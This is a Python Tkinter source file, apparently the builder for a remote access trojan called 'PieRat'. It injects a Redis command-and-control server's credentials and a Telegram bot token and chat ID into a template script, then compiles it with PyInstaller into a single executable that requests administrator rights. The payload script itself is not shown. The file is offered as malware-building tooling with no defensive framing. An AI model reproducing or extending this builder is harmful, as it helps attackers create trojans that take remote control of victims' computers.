import tkinter as tk
from tkinter import filedialog, messagebox
import re
import subprocess
import shutil
import os

def parse_redis_url(command):
    try:
        cli_pattern = r"redis-cli\s+-u\s+(redis://[^ ]+)"
        cli_match = re.match(cli_pattern, command)
        
        if not cli_match:
            return None

        redis_url = cli_match.group(1)

        url_pattern = r"redis://([^:]*):([^@]*)@([^:]*):(\d+)"
        url_match = re.match(url_pattern, redis_url)
        
        if url_match:
            return {
                "host": url_match.group(3),
                "password": url_match.group(2),
                "port": int(url_match.group(4))
            }
        else:
            return None
    except Exception as e:
        print(f"Error parsing Redis CLI command: {e}")
        return None

def create_build_script(original_script, redis_info, telegram_token, chat_id):
    try:
        build_script_path = original_script.replace(".py", "_build.py")
        
        with open(original_script, 'r') as file:
            content = file.read()
        
        updated_content = content
        updated_content = updated_content.replace('REDIS_HOST = ""', f'REDIS_HOST = "{redis_info["host"]}"')
        updated_content = updated_content.replace('REDIS_PORT = 000', f'REDIS_PORT = {redis_info["port"]}')
        updated_content = updated_content.replace('REDIS_PASS = ""', f'REDIS_PASS = "{redis_info["password"]}"')
        updated_content = updated_content.replace('TELEGRAM_BOT_TOKEN = ""', f'TELEGRAM_BOT_TOKEN = "{telegram_token}"')
        updated_content = updated_content.replace('NOTIFY_CHATID = ""', f'NOTIFY_CHATID = "{chat_id}"')

        with open(build_script_path, 'w') as file:
            file.write(updated_content)
        
        return build_script_path
    except Exception as e:
        messagebox.showerror("Error", f"Failed to create build script: {e}")
        return None

def compile_script(script_path):
    try:
        subprocess.run([
            "pyinstaller", 
            script_path, 
            "-i=NONE", 
            "--onefile", 
            "--uac-admin", 
            "--clean"
        ], check=True)
        messagebox.showinfo("Success", "Executable compiled successfully!")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"Compilation failed: {e}")
    finally:
        if os.path.exists(script_path):
            os.remove(script_path)

def main():
    def on_submit():
        script = "main.py"
        tg_token = telegram_token.get()
        chat_id = notify_chat_id.get()
        redis_cmd = redis_command.get().strip()

        if not all([tg_token, chat_id, redis_cmd]):
            messagebox.showerror("Error", "All fields must be filled!")
            return

        redis_info = parse_redis_url(redis_cmd)
        if not redis_info:
            messagebox.showerror("Error", "Invalid Redis command!")
            return

        build_script = create_build_script(script, redis_info, tg_token, chat_id)
        if build_script:
            compile_script(build_script)

    root = tk.Tk()
    root.title("PieRat Builder")

    telegram_token = tk.StringVar()
    notify_chat_id = tk.StringVar()
    redis_command = tk.StringVar()

    tk.Label(root, text="Telegram Token:").grid(row=0, column=0, sticky="e", padx=5, pady=5)
    tk.Entry(root, textvariable=telegram_token, width=50).grid(row=0, column=1, columnspan=2, padx=5, pady=5)

    tk.Label(root, text="Chat ID:").grid(row=1, column=0, sticky="e", padx=5, pady=5)
    tk.Entry(root, textvariable=notify_chat_id, width=50).grid(row=1, column=1, columnspan=2, padx=5, pady=5)

    tk.Label(root, text="Redis Command:").grid(row=2, column=0, sticky="e", padx=5, pady=5)
    tk.Entry(root, textvariable=redis_command, width=50).grid(row=2, column=1, columnspan=2, padx=5, pady=5)

    tk.Button(root, text="Submit", command=on_submit).grid(row=3, column=1, pady=10)

    root.mainloop()

if __name__ == "__main__":
    main()
